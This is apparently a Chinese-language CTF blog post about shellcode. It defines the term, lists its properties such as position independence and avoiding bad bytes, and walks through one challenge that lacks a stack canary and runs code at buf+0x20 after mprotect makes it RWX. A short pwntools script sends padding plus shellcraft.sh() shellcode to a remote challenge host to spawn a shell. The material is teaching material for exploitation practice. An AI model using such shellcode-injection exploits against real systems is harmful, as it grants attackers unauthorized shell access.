---
title: Shellcode
date: 2019-05-22 14:19:00
categories: 
  - Pwn
tags:
  - Pwn
---

# Shellcode

## 原理

狭义上说，Shellcode 是一段用于获取交互式命令行的机器码

广义上，任何用于完成攻击目标（反弹连接、添加用户、下载执行）的自包含机器码都可以叫 Shellcode

它的特点：

- 完全由汇编指令组成，经过编译、提取成为纯二进制字节

- 与位置无关，不依赖外部环境，放到哪都能跑（通过相对寻址等技巧）

- 尽量精简、无坏字符，比如不能包含 `0x00`（截断 `strcpy`），不能有换行 `0x0a` 等

## 实战案例

### 该怎么起名呢（Shellcode）

![](https://pic1.imgdb.cn/item/6a2c2aaa79b3658c76e3c194.png)

没开金丝雀

![](https://pic1.imgdb.cn/item/6a2b7155240596c6e205c040.png)

`mprotect` 的第三个参数 7 代表 RWX 权限，从指针 buf 向前偏移 16 字节 的地址开始，长度为 4096 字节

`((buf + 32))();` 表示 `buf + 0x20` 处会被当成函数调用执行

所以填充垃圾数据覆盖到这个位置再插入 shellcode

![](https://pic1.imgdb.cn/item/6a2b72ad240596c6e205c1b1.png)

```python
from pwn import *
p = process('./main')
context.arch = 'AMD64'
p = remote('49.232.142.230', 11777)

p.sendlineafter('shellcode', b'A'*0x20 + asm(shellcraft.sh()))
p.interactive()
```